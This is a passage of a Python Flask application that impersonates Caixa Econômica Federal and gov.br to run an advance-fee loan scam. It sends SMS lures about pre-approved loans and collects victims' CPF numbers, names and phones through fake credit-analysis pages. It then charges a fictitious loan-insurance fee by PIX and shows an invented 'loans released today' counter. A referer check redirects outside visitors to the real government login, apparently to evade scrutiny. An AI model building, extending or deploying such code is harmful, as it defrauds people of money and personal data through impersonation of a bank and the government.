import os
import re
import random
import string
import time
import uuid
import urllib.parse
import requests
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, make_response
from dotenv import load_dotenv
import logging
from functools import wraps
import datetime
import json

# Importar as classes de API de pagamento
from for4payments import create_payment_api as create_for4_api
from novaerapayments import create_payment_api as create_novaera_api
from payment_gateway import get_payment_gateway

# Configurar logging
logging.basicConfig(level=logging.INFO)

# Criar a aplicação Flask
app = Flask(__name__)

# Configurar secret key
app.secret_key = os.environ.get("SESSION_SECRET") or 'dev_secret_key'

# Carregar variáveis de ambiente
load_dotenv()

# Função para verificar o referer (domínio de origem)
def check_referer(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Permitir acesso em ambiente de desenvolvimento
        if 'replit.dev' in request.host or '127.0.0.1' in request.host or 'localhost' in request.host:
            app.logger.info(f"Ambiente de desenvolvimento detectado. Permitindo acesso. Referer: {request.referrer}, Path: {request.path}")
            return f(*args, **kwargs)

        # Verificar se o referer existe e se é do mesmo domínio
        if request.referrer:
            referer_domain = urllib.parse.urlparse(request.referrer).netloc
            request_domain = request.host
            
            if referer_domain == request_domain or 'govz.me' in referer_domain:
                return f(*args, **kwargs)

        # Se chegar aqui, o acesso é negado
        app.logger.warning(f"[PROD] Acesso bloqueado para {request.path} do referer {request.referrer}")
        return redirect('https://sso.acesso.gov.br/login')
    
    return decorated_function

# Função para enviar código de verificação via SMS através da SMSDEV
def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using SMSDEV API
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Limpar o número de telefone (manter apenas dígitos)
        clean_phone = re.sub(r'\D', '', phone_number)
        
        if len(clean_phone) < 10 or len(clean_phone) > 11:
            return False, "Número de telefone inválido"
        
        # API key
        api_key = os.environ.get('SMSDEV_API_KEY', '') 
        if not api_key:
            app.logger.error("SMSDEV_API_KEY não configurada")
            return False, "Erro de configuração do serviço SMS"
            
        # Construir a mensagem
        message = f"[CAIXA] Código de verificação: {verification_code}"
        
        # Parâmetros para a API
        params = {
            'key': api_key,
            'type': '9', # SMS com resposta
            'number': clean_phone,
            'msg': message
        }
        
        # Endpoint da API
        url = 'https://api.smsdev.com.br/v1/send'
        
        # Enviar a requisição
        response = requests.get(url, params=params, timeout=10)
        
        # Verificar a resposta
        if response.status_code == 200:
            data = response.json()
            if 'situacao' in data and data['situacao'] == 'OK':
                app.logger.info(f"SMS enviado para {clean_phone}. ID: {data.get('id')}")
                return True, None
            else:
                error = data.get('descricao', 'Erro desconhecido')
                app.logger.error(f"Erro ao enviar SMS via SMSDEV: {error}")
                return False, f"Erro ao enviar SMS: {error}"
        else:
            app.logger.error(f"Erro na resposta da API SMSDEV: Status {response.status_code}")
            return False, f"Erro de comunicação com o serviço SMS: {response.status_code}"
            
    except Exception as e:
        app.logger.error(f"Exceção ao enviar SMS via SMSDEV: {str(e)}")
        return False, f"Erro ao enviar SMS: {str(e)}"

# Função para enviar código de verificação via Owen SMS API
def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using Owen SMS API v2
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Limpar o número de telefone (manter apenas dígitos)
        clean_phone = re.sub(r'\D', '', phone_number)
        
        if len(clean_phone) < 10 or len(clean_phone) > 11:
            return False, "Número de telefone inválido"
        
        # Token de autenticação
        auth_token = os.environ.get('OWEN_SMS_TOKEN', '')
        sender_id = os.environ.get('OWEN_SMS_SENDER_ID', 'INFO')
        
        if not auth_token:
            app.logger.error("OWEN_SMS_TOKEN não configurado")
            return False, "Erro de configuração do serviço SMS alternativo"
        
        # Endpoint da API v2
        url = 'https://api.owen.com.br/sms/v2'
        
        # Construir a mensagem
        message = f"[CAIXA] Código de verificação: {verification_code}"
        
        # Corpo da requisição
        payload = {
            "destinations": [
                {
                    "to": clean_phone,
                    "text": message,
                    "id": str(uuid.uuid4()),
                    "from": sender_id
                }
            ]
        }
        
        # Cabeçalhos
        headers = {
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json'
        }
        
        # Enviar a requisição
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        # Verificar a resposta
        if response.status_code == 200:
            data = response.json()
            # Verificar se todas as mensagens foram aceitas
            if data.get('accepted', 0) > 0:
                app.logger.info(f"SMS enviado para {clean_phone} via Owen SMS API")
                return True, None
            else:
                reasons = []
                for result in data.get('results', []):
                    reasons.append(f"{result.get('status')}: {result.get('reason')}")
                
                error_message = '; '.join(reasons) if reasons else 'Mensagem não aceita'
                app.logger.error(f"Erro ao enviar SMS via Owen: {error_message}")
                return False, f"Erro ao enviar SMS: {error_message}"
        else:
            app.logger.error(f"Erro na resposta da API Owen: Status {response.status_code}, {response.text}")
            return False, f"Erro de comunicação com o serviço SMS alternativo: {response.status_code}"
            
    except Exception as e:
        app.logger.error(f"Exceção ao enviar SMS via Owen: {str(e)}")
        return False, f"Erro ao enviar SMS (alternativo): {str(e)}"

# Função para enviar código de verificação tentando primeiro SMSDEV e depois Owen como fallback
def send_verification_code(phone_number: str) -> tuple:
    """
    Sends a verification code via the selected SMS API
    Returns a tuple of (success, code or error_message)
    """
    # Gerar código de verificação de 6 dígitos
    verification_code = ''.join(random.choices(string.digits, k=6))
    
    # Determinar qual API usar com base na configuração
    sms_api = os.environ.get('SMS_API', 'SMSDEV').upper()
    app.logger.info(f"Enviando código de verificação via {sms_api} para {phone_number}")
    
    # Tentar enviar usando SMSDEV por padrão
    if sms_api == 'SMSDEV':
        success, error = send_verification_code_smsdev(phone_number, verification_code)
        
        # Se falhar, tentar Owen como fallback
        if not success and os.environ.get('OWEN_SMS_TOKEN'):
            app.logger.info(f"SMSDEV falhou, tentando Owen como fallback para {phone_number}")
            success, error = send_verification_code_owen(phone_number, verification_code)
    
    # Usar Owen como primeira opção se configurado
    elif sms_api == 'OWEN':
        success, error = send_verification_code_owen(phone_number, verification_code)
        
        # Se falhar, tentar SMSDEV como fallback
        if not success and os.environ.get('SMSDEV_API_KEY'):
            app.logger.info(f"Owen falhou, tentando SMSDEV como fallback para {phone_number}")
            success, error = send_verification_code_smsdev(phone_number, verification_code)
    
    # Configuração inválida
    else:
        app.logger.error(f"API SMS inválida configurada: {sms_api}")
        return False, "Configuração inválida de API SMS"
    
    if success:
        return True, verification_code
    else:
        return False, error

# Função para enviar SMS via SMSDEV
def send_sms_smsdev(phone_number: str, message: str) -> bool:
    """
    Send SMS using SMSDEV API
    """
    try:
        # Limpar o número de telefone (manter apenas dígitos)
        clean_phone = re.sub(r'\D', '', phone_number)
        
        if len(clean_phone) < 10 or len(clean_phone) > 11:
            app.logger.error(f"[PROD] Número de telefone inválido para envio de SMS: {phone_number}")
            return False
        
        # API key
        api_key = os.environ.get('SMSDEV_API_KEY', '')
        if not api_key:
            app.logger.error("[PROD] SMSDEV_API_KEY não configurada")
            return False
            
        # Verificar se a mensagem contém uma URL para encurtar
        short_url = '1' if 'http' in message else '0'
        if short_url == '1':
            app.logger.info(f"[PROD] URL detectada para encurtamento: {message}")
        
        # Parâmetros para a API
        params = {
            'key': api_key,
            'type': '9',  # SMS com resposta
            'number': clean_phone,
            'msg': message,
            'short_url': short_url
        }
        
        # Endpoint da API
        url = 'https://api.smsdev.com.br/v1/send'
        
        # Enviar a requisição
        app.logger.info(f"[PROD] Enviando SMS via SMSDEV para {clean_phone} com encurtamento de URL ativado. Payload: {params}")
        response = requests.get(url, params=params, timeout=30)
        
        # Verificar a resposta
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[PROD] SMSDEV: SMS enviado para {clean_phone}. Resposta: {data}")
            
            if 'situacao' in data and data['situacao'] == 'OK':
                app.logger.info(f"[PROD] SMS enviado com sucesso para {clean_phone}, ID: {data.get('id')}")
                return True
            else:
                error = data.get('descricao', 'Erro desconhecido')
                app.logger.error(f"[PROD] Erro ao enviar SMS via SMSDEV: {error}")
                return False
        else:
            app.logger.error(f"[PROD] Erro na resposta da API SMSDEV: Status {response.status_code}, Body: {response.text}")
            return False
            
    except Exception as e:
        app.logger.error(f"[PROD] Exceção ao enviar SMS via SMSDEV: {str(e)}")
        return False

# Função para enviar SMS via Owen SMS API
def send_sms_owen(phone_number: str, message: str) -> bool:
    """
    Send SMS using Owen SMS API v2 with curl
    """
    try:
        # Limpar o número de telefone (manter apenas dígitos)
        clean_phone = re.sub(r'\D', '', phone_number)
        
        if len(clean_phone) < 10 or len(clean_phone) > 11:
            app.logger.error(f"[PROD] Número de telefone inválido para envio de SMS via Owen: {phone_number}")
            return False
        
        # Token de autenticação
        auth_token = os.environ.get('OWEN_SMS_TOKEN', '')
        sender_id = os.environ.get('OWEN_SMS_SENDER_ID', 'INFO')
        
        if not auth_token:
            app.logger.error("[PROD] OWEN_SMS_TOKEN não configurado")
            return False
        
        # Endpoint da API v2
        url = 'https://api.owen.com.br/sms/v2'
        
        # Corpo da requisição
        payload = {
            "destinations": [
                {
                    "to": clean_phone,
                    "text": message,
                    "id": str(uuid.uuid4()),
                    "from": sender_id
                }
            ]
        }
        
        # Cabeçalhos
        headers = {
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json'
        }
        
        # Enviar a requisição
        app.logger.info(f"[PROD] Enviando SMS via Owen para {clean_phone}. Payload: {payload}")
        response = requests.post(url, json=payload, headers=headers, timeout=30)
        
        # Verificar a resposta
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[PROD] Owen: SMS enviado para {clean_phone}. Resposta: {data}")
            
            # Verificar se todas as mensagens foram aceitas
            if data.get('accepted', 0) > 0:
                app.logger.info(f"[PROD] SMS enviado com sucesso para {clean_phone} via Owen SMS API")
                return True
            else:
                reasons = []
                for result in data.get('results', []):
                    reasons.append(f"{result.get('status')}: {result.get('reason')}")
                
                error_message = '; '.join(reasons) if reasons else 'Mensagem não aceita'
                app.logger.error(f"[PROD] Erro ao enviar SMS via Owen: {error_message}")
                return False
        else:
            app.logger.error(f"[PROD] Erro na resposta da API Owen: Status {response.status_code}, Body: {response.text}")
            return False
            
    except Exception as e:
        app.logger.error(f"[PROD] Exceção ao enviar SMS via Owen: {str(e)}")
        return False

# Função para enviar SMS tentando primeiro SMSDEV e depois Owen como fallback
def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
    """
    Send SMS notification about the loan approval
    Returns success status (boolean)
    """
    first_name = full_name.split()[0] if full_name else "Cliente"
    formatted_amount = f"R$ {amount:,.2f}".replace(',', 'X').replace('.', ',').replace('X', '.')
    
    # Construir a mensagem
    message = f"[CAIXA] Prezado(a) {first_name}, seu empréstimo no valor de {formatted_amount} foi pré-aprovado! Clique no link para continuar: http://gov.br/emprestimo"
    
    # Determinar qual API usar com base na configuração
    sms_api = os.environ.get('SMS_API', 'SMSDEV').upper()
    app.logger.info(f"[PROD] Enviando SMS via {sms_api} para {phone_number}")
    
    # Tentar enviar usando SMSDEV por padrão
    if sms_api == 'SMSDEV':
        success = send_sms_smsdev(phone_number, message)
        
        # Se falhar, tentar Owen como fallback
        if not success and os.environ.get('OWEN_SMS_TOKEN'):
            app.logger.info(f"[PROD] SMSDEV falhou, tentando Owen como fallback para {phone_number}")
            success = send_sms_owen(phone_number, message)
    
    # Usar Owen como primeira opção se configurado
    elif sms_api == 'OWEN':
        success = send_sms_owen(phone_number, message)
        
        # Se falhar, tentar SMSDEV como fallback
        if not success and os.environ.get('SMSDEV_API_KEY'):
            app.logger.info(f"[PROD] Owen falhou, tentando SMSDEV como fallback para {phone_number}")
            success = send_sms_smsdev(phone_number, message)
    
    # Configuração inválida
    else:
        app.logger.error(f"[PROD] API SMS inválida configurada: {sms_api}")
        return False
    
    return success

# Função para enviar SMS de confirmação de pagamento
def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
    """
    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
    """
    # Limpar o telefone e pegar apenas o primeiro nome
    clean_phone = re.sub(r'\D', '', phone_number)
    first_name = nome.split()[0] if nome else "Cliente"
    
    if len(clean_phone) < 10 or len(clean_phone) > 11:
        app.logger.error(f"[PROD] Número de telefone inválido para envio de SMS de confirmação: {phone_number}")
        return False
    
    # Criar mensagem com link para página de agradecimento
    message = f"[CAIXA] Olá {first_name}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
    
    # Determinar qual API usar, mas sempre usar SMSDEV por padrão por causa do encurtador de URL
    sms_api = 'SMSDEV'
    
    # Tentar até 3 vezes com SMSDEV por causa do encurtador de URL
    max_attempts = 3
    attempt = 0
    success = False
    
    while attempt < max_attempts and not success:
        attempt += 1
        app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS de confirmação via SMSDEV")
        success = send_sms_smsdev(clean_phone, message)
        
        if success:
            app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso na tentativa {attempt}")
            break
        elif attempt < max_attempts:
            app.logger.info(f"[PROD] Tentativa {attempt} falhou, tentando novamente em 2 segundos...")
            time.sleep(2)
    
    # Se todas as tentativas com SMSDEV falharem, tentar com Owen como último recurso
    # (mas perderemos o encurtador de URL)
    if not success and os.environ.get('OWEN_SMS_TOKEN'):
        app.logger.info(f"[PROD] Todas as tentativas com SMSDEV falharam, tentando Owen como último recurso")
        success = send_sms_owen(clean_phone, message)
    
    return success

# Função para gerar email aleatório com base no nome
def generate_random_email(name: str) -> str:
    clean_name = ''.join(e.lower() for e in name if e.isalnum())
    random_num = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_num}@{domain}"

# Função para formatar CPF
def format_cpf(cpf: str) -> str:
    # Remover caracteres não numéricos
    digits = re.sub(r'\D', '', cpf)
    
    # Verificar se tem 11 dígitos
    if len(digits) != 11:
        return cpf  # Retornar o valor original se não for um CPF válido
    
    # Formatar como XXX.XXX.XXX-XX
    return f"{digits[0:3]}.{digits[3:6]}.{digits[6:9]}-{digits[9:11]}"

# Função para gerar número de telefone aleatório
def generate_random_phone():
    # Gerar DDD válido (entre 11 e 99)
    ddd = random.randint(11, 99)
    
    # Gerar número de 8 dígitos
    number = ''.join(random.choices(string.digits, k=8))
    
    return f"{ddd}{number}"

# Função para gerar QR code PIX
def generate_qr_code(pix_code: str) -> str:
    """Gera um QR code para o código PIX fornecido"""
    try:
        import qrcode
        from io import BytesIO
        import base64
        
        # Criar QR code
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(pix_code)
        qr.make(fit=True)
        
        # Gerar imagem
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Converter para base64
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode("utf-8")
        
        return f"data:image/png;base64,{img_str}"
    except Exception as e:
        app.logger.error(f"Erro ao gerar QR code: {str(e)}")
        return ""

# Página inicial
@app.route('/')
@check_referer
def index():
    # Inicializar dados do usuário (vazios por padrão)
    user_data = {
        'nome': request.args.get('nome', ''),
        'cpf': request.args.get('cpf', ''),
        'phone': request.args.get('phone', '')
    }
    
    app.logger.info(f"[PROD] Renderizando página inicial para: {user_data}")
    
    # Verificar se há mensagem de erro
    error_message = request.args.get('error', '')
    
    return render_template('index.html', 
                          nome=user_data['nome'], 
                          cpf=user_data['cpf'], 
                          phone=user_data['phone'],
                          error=error_message)

# Página de pagamento
@app.route('/payment')
@check_referer
def payment():
    # Obter parâmetros da URL
    nome = request.args.get('nome', '')
    cpf = request.args.get('cpf', '')
    phone = request.args.get('phone', '')
    pix_key = request.args.get('pix_key', '')
    bank = request.args.get('bank', 'Caixa Econômica Federal')
    amount = request.args.get('amount', '47.60')
    source = request.args.get('source', 'insurance')
    
    # Formatar CPF se estiver presente
    formatted_cpf = format_cpf(cpf) if cpf else ''
    
    # Verificar se todos os campos obrigatórios estão presentes
    if not nome or not cpf:
        return redirect(url_for('index', error='Dados incompletos. Por favor, preencha todos os campos.'))
    
    # Inicializar contador aleatório para empréstimos liberados hoje
    random_count = random.randint(8500, 12000)
    
    return render_template('payment.html', 
                          nome=nome, 
                          cpf=formatted_cpf,
                          phone=phone,
                          pix_key=pix_key,
                          bank=bank,
                          amount=amount,
                          source=source,
                          random_count=random_count)

# Página para gerar novo pagamento PIX
@app.route('/payment_update')
@check_referer
def payment_update():
    # Obter parâmetros da URL
    nome = request.args.get('nome', '')
    cpf = request.args.get('cpf', '')
    phone = request.args.get('phone', '')
    amount_str = request.args.get('amount', '47.60')
    
    # Converter valor para float, substituindo vírgula por ponto se necessário
    try:
        amount = float(amount_str.replace(',', '.'))
    except ValueError:
        amount = 47.60
    
    # Formatar CPF se estiver presente
    formatted_cpf = format_cpf(cpf) if cpf else ''
    
    # Verificar se todos os campos obrigatórios estão presentes
    if not nome or not cpf:
        return redirect(url_for('index', error='Dados incompletos. Por favor, preencha todos os campos.'))
    
    try:
        # Criar pagamento PIX
        payment_data = {
            'name': nome,
            'cpf': cpf,
            'email': generate_random_email(nome),
            'amount': amount
        }
        
        app.logger.info(f"[PROD] Criando pagamento PIX para {nome}, CPF {cpf}, valor R$ {amount:.2f}")
        
        # Usar gateway configurado
        api = get_payment_gateway()
        pix_data = api.create_pix_payment(payment_data)
        
        # Log dos dados PIX recebidos
        app.logger.info(f"[PROD] Dados PIX recebidos: {pix_data}")
        
        # Verificar se temos o código PIX
        pix_code = pix_data.get('pixCode')
        if not pix_code:
            raise ValueError("Código PIX não retornado pela API")
        
        # Obter QR code (da API ou gerar localmente)
        qr_code = pix_data.get('pixQrCode')
        if not qr_code:
            qr_code = generate_qr_code(pix_code)
        
        # Renderizar template com o PIX
        app.logger.info(f"[PROD] Renderizando página de pagamento PIX para {nome}")
        return render_template('payment_update.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Passando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=74.90)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/check-payment-status/<transaction_id>')
@check_referer
def check_payment_status(transaction_id):
    try:
        # Obter informações do usuário da sessão se disponíveis
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        
        # Logs detalhados de entrada para depuração
        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id} para cliente: nome={nome}, cpf={cpf}, phone={phone}")
        
        # Validar dados do cliente
        if not nome or not cpf:
            app.logger.warning(f"[PROD] Dados incompletos do cliente ao verificar pagamento. nome={nome}, cpf={cpf}")
        
        if not phone:
            app.logger.warning(f"[PROD] Telefone não fornecido para envio de SMS de confirmação: {transaction_id}")
        else:
            formatted_phone = re.sub(r'\D', '', phone)
            if len(formatted_phone) != 11:
                app.logger.warning(f"[PROD] Formato de telefone inválido: {phone} (formatado: {formatted_phone})")
            else:
                app.logger.info(f"[PROD] Telefone válido para SMS: {formatted_phone}")
        
        # Verificar status na API de pagamento
        api = get_payment_gateway()
        status_data = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status_data}")
        
        # Verificar se o pagamento foi aprovado
        is_completed = status_data.get('status') == 'completed'
        is_approved = status_data.get('original_status') in ['APPROVED', 'PAID']
        
        if is_completed or is_approved:
            app.logger.info(f"[PROD] PAGAMENTO APROVADO: {transaction_id} - Status: {status_data.get('status')}, Original Status: {status_data.get('original_status')}")
            
            # Construir o URL personalizado para a página de agradecimento
            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
            
            # Obter dados adicionais enviados pelo frontend via localStorage
            bank = request.args.get('bank')
            pix_key = request.args.get('pix_key')
            pix_key_type = request.args.get('pix_key_type')
            loan_amount = request.args.get('loan_amount')
            
            # Log dos parâmetros recebidos para debug
            app.logger.info(f"[PROD] Parâmetros recebidos na requisição: bank={bank}, pix_key={pix_key}, pix_key_type={pix_key_type}, loan_amount={loan_amount}")
            
            # Aplicar valores padrão se não forem fornecidos
            if not bank or bank == '':
                bank = 'Caixa Econômica Federal'
                
            if not pix_key or pix_key == '':
                # Se tivermos o tipo de chave PIX, usamos isso para determinar o valor padrão
                if pix_key_type == 'phone':
                    pix_key = phone if phone else ''
                else:
                    pix_key = cpf if cpf else ''
                    
            if not loan_amount or loan_amount == '':
                loan_amount = '4000'
                
            app.logger.info(f"[PROD] Valores finais para SMS: banco={bank}, chave_pix={pix_key}, valor_emprestimo={loan_amount}")
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {
                'nome': nome if nome else '',
                'cpf': cpf if cpf else '',
                'phone': phone if phone else '',
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount,
                'utm_source': 'smsempresa',
                'utm_medium': 'sms',
                'utm_campaign': '',
                'utm_content': phone if phone else ''
            }
                
            # Construir a URL completa com parâmetros codificados corretamente para evitar problemas de encurtamento
            if params:
                # Usar urllib para codificar os parâmetros corretamente
                import urllib.parse
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url += '?' + query_string
            
            app.logger.info(f"[PROD] URL personalizado de agradecimento: {thank_you_url}")
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                app.logger.info(f"[PROD] Preparando envio de SMS para {phone}")
                
                # Fazer várias tentativas de envio direto usando SMSDEV
                max_attempts = 3
                attempt = 0
                sms_sent = False
                
                while attempt < max_attempts and not sms_sent:
                    attempt += 1
                    try:
                        app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS via SMSDEV diretamente")
                        
                        # Formatar o nome para exibição
                        nome_formatado = nome.split()[0] if nome else "Cliente"
                        
                        # Mensagem personalizada com link para thank_you_url
                        message = f"[CAIXA] Olá {nome_formatado}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
                        
                        # Enviar o SMS
                        sms_sent = send_sms_smsdev(phone, message)
                        
                        if sms_sent:
                            app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} diretamente via SMSDEV")
                            break
                        else:
                            app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}")
                            if attempt < max_attempts:
                                time.sleep(1)  # Esperar um segundo antes da próxima tentativa
                    
                    except Exception as e:
                        app.logger.error(f"[PROD] Erro ao enviar SMS diretamente na tentativa {attempt}: {str(e)}")
                        if attempt < max_attempts:
                            time.sleep(1)
                
                # Se não conseguiu enviar via SMSDEV diretamente, tentar usar a função de alto nível
                if not sms_sent:
                    app.logger.info(f"[PROD] Tentando método alternativo de envio de SMS após {max_attempts} tentativas diretas")
                    sms_sent = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                
                # Resultado final do envio
                if sms_sent:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone} após todas as tentativas")
            
            # Retornar o status para o cliente
            return jsonify(status_data)
        
        # Retornar o status atual para o cliente
        return jsonify(status_data)
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({'status': 'pending', 'original_status': 'ERROR', 'error': str(e)})

@app.route('/verificar-cpf', methods=['GET', 'POST'])
@check_referer
def verificar_cpf():
    if request.method == 'POST':
        cpf = request.form.get('cpf', '').strip()
        # Limpar CPF (manter apenas dígitos)
        cpf_limpo = re.sub(r'\D', '', cpf)
        
        # Verificar se o CPF tem 11 dígitos
        if len(cpf_limpo) != 11:
            return render_template('verificar_cpf.html', error="CPF inválido. Por favor, digite um CPF válido.")
        
        # Simulação de consulta
        # Na prática, aqui você faria a consulta no seu banco de dados ou sistema
        return redirect(url_for('buscar_cpf', cpf=cpf_limpo))
    
    return render_template('verificar_cpf.html')

@app.route('/buscar-cpf')
@check_referer
def buscar_cpf():
    cpf = request.args.get('cpf', '')
    
    # Limpar CPF (manter apenas dígitos)
    cpf_limpo = re.sub(r'\D', '', cpf)
    
    # Verificar se o CPF tem 11 dígitos
    if len(cpf_limpo) != 11:
        return redirect(url_for('verificar_cpf', error="CPF inválido. Por favor, digite um CPF válido."))
    
    # Simulação de verificação de CPF
    # Na prática, aqui você faria a consulta no seu banco de dados ou sistema
    return render_template('input_cpf.html', cpf=cpf_limpo)

@app.route('/input-cpf', methods=['GET', 'POST'])
@check_referer
def input_cpf():
    if request.method == 'POST':
        cpf = request.form.get('cpf', '').strip()
        nome = request.form.get('nome', '').strip()
        phone = request.form.get('phone', '').strip()
        
        # Validações básicas
        if not nome or len(nome) < 5:
            return render_template('input_cpf.html', cpf=cpf, nome=nome, phone=phone, error="Nome completo inválido.")
        
        # Limpar telefone (manter apenas dígitos)
        phone_limpo = re.sub(r'\D', '', phone)
        if len(phone_limpo) < 10:
            return render_template('input_cpf.html', cpf=cpf, nome=nome, phone=phone, error="Telefone inválido. Digite o DDD + número.")
        
        # Redirecionar para análise do CPF
        return redirect(url_for('analisar_cpf', cpf=cpf, nome=nome, phone=phone_limpo))
    
    cpf = request.args.get('cpf', '')
    return render_template('input_cpf.html', cpf=cpf)

@app.route('/analisar-cpf')
@check_referer
def analisar_cpf():
    # Pegar parâmetros da URL
    cpf = request.args.get('cpf', '')
    nome = request.args.get('nome', '')
    phone = request.args.get('phone', '')
    
    # Limpar CPF (manter apenas dígitos)
    cpf_limpo = re.sub(r'\D', '', cpf)
    
    # Verificar se o CPF tem 11 dígitos
    if len(cpf_limpo) != 11:
        return redirect(url_for('verificar_cpf', error="CPF inválido. Por favor, digite um CPF válido."))
    
    # Formatar CPF para exibição
    cpf_formatado = format_cpf(cpf_limpo)
    
    return render_template('analisar_cpf.html', cpf=cpf_formatado, nome=nome, phone=phone)

@app.route('/opcoes-emprestimo')
@check_referer
def opcoes_emprestimo():
    # Pegar parâmetros da URL
    cpf = request.args.get('cpf', '')
    nome = request.args.get('nome', '')
    phone = request.args.get('phone', '')
    
    # Limpar CPF (manter apenas dígitos)
    cpf_limpo = re.sub(r'\D', '', cpf)
    
    # Validações básicas
    if len(cpf_limpo) != 11 or not nome or not phone:
        return redirect(url_for('verificar_cpf', error="Dados inválidos ou incompletos. Por favor, comece novamente."))
    
    # Formatar CPF para exibição
    cpf_formatado = format_cpf(cpf_limpo)
    
    # Calcular opções de empréstimo
    valor_base = 6000
    parcela_base = 68
    meses = 90
    
    opcoes = []
    for i in range(5):
        valor = valor_base + (i * 2000)
        parcela = parcela_base + (i * 22)
        opcoes.append({
            'valor': valor,
            'parcela': parcela,
            'meses': meses
        })
    
    return render_template('opcoes_emprestimo.html', 
                          cpf=cpf_formatado, 
                          nome=nome, 
                          phone=phone, 
                          opcoes=opcoes)

@app.route('/seguro-prestamista')
@check_referer
def seguro_prestamista():
    # Pegar parâmetros da URL
    cpf = request.args.get('cpf', '')
    nome = request.args.get('nome', '')
    phone = request.args.get('phone', '')
    valor = request.args.get('valor', '6000')
    parcela = request.args.get('parcela', '68')
    meses = request.args.get('meses', '90')
    
    # Limpar CPF (manter apenas dígitos)
    cpf_limpo = re.sub(r'\D', '', cpf)
    
    # Validações básicas
    if len(cpf_limpo) != 11 or not nome or not phone:
        return redirect(url_for('verificar_cpf', error="Dados inválidos ou incompletos. Por favor, comece novamente."))
    
    # Formatar CPF para exibição
    cpf_formatado = format_cpf(cpf_limpo)
    
    # Calcular valor do seguro (aproximadamente 0.8% do valor do empréstimo)
    try:
        valor_float = float(valor)
        seguro = valor_float * 0.008
        seguro_formatado = f"{seguro:.2f}"
    except:
        seguro_formatado = "47.60"  # Valor padrão
    
    return render_template('seguro_prestamista.html', 
                          cpf=cpf_formatado, 
                          nome=nome, 
                          phone=phone, 
                          valor=valor,
                          parcela=parcela,
                          meses=meses,
                          seguro=seguro_formatado)

@app.route('/obrigado')
@check_referer
def thank_you():
    # Obter parâmetros do usuário a partir da URL
    nome = request.args.get('nome', '')
    cpf = request.args.get('cpf', '')
    phone = request.args.get('phone', '')
    bank = request.args.get('bank', '')
    pix_key = request.args.get('pix_key', '')
    loan_amount = request.args.get('loan_amount', '')
    
    # Log dos parâmetros recebidos
    app.logger.info(f"[PROD] Renderizando página de agradecimento com dados: {{'name': '{nome}', 'cpf': '{cpf}', 'phone': '{phone}', 'bank': '{bank}', 'pix_key': '{pix_key}', 'loan_amount': '{loan_amount}'}}")
    
    # Preparar dados para o template
    user_data = {
        'fullName': nome,
        'firstName': nome.split()[0] if nome else '',
        'formattedCpf': cpf,
        'loanAmount': f"R${int(loan_amount):,}".replace(',', '.') + ",00" if loan_amount and loan_amount.isdigit() else "R$4.000,00",
        'bankName': bank if bank else "CAIXA ECONÔMICA FEDERAL",
        'pixKey': pix_key if pix_key else cpf
    }
    
    # Calcular dias úteis para aprovação (entre 1 e 3)
    dias_uteis = random.randint(1, 3)
    
    # Renderizar template
    return render_template('thank_you.html', 
                          nome=nome, 
                          cpf=cpf, 
                          phone=phone,
                          user_data=user_data,
                          dias_uteis=dias_uteis)

@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    # Obter dados do formulário
    try:
        data = request.get_json()
        
        # Validar dados mínimos
        required_fields = ['name', 'cpf', 'amount']
        for field in required_fields:
            if field not in data or not data[field]:
                return jsonify({'error': f'Campo obrigatório ausente: {field}'}), 400
        
        app.logger.info(f"[PROD] For4Payments: Criando pagamento PIX para {data['name']}, CPF {data['cpf']}, valor R$ {data['amount']}")
        
